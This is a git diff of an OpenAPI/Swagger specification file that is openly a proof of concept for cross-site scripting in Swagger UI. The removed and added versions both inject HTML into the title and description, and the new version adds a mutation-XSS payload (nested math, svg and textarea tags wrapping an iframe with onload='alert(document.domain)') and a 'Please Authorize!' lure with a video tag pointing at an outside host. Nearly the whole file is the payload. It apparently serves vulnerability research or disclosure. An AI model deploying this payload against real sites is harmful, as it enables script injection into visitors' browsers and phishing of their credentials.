@@ -1,15 +1,9 @@
-swagger: '2.0'
-securityDefinitions:
-  a:
-    type: oauth2
-    authorizationUrl: http://authorization.site
+openapi: "3.0.0"
+
 info:
-  version: "0.0.1"
-  title: <h1>paulisusu POC arbitrary html h1 text<h1>
-  description: Please Authorize!<video src=//authorization.site>
-paths:
-  /:
-    get:
-      responses:
-        200:
-          description: Successful respons
+  title: paulisusu Swagger XSS
+  description:
+    <h1>test h1 tag</h1>
+    <h1>poc</h1>
+    Please Authorize!<video src=//authorization.site>
+    <math><mi><table><mglyph><svg><mtext><textarea><a title="</textarea><iframe onload='alert(document.domain)'>"></a></textarea></mtext></svg></mglyph></table></mi></math>
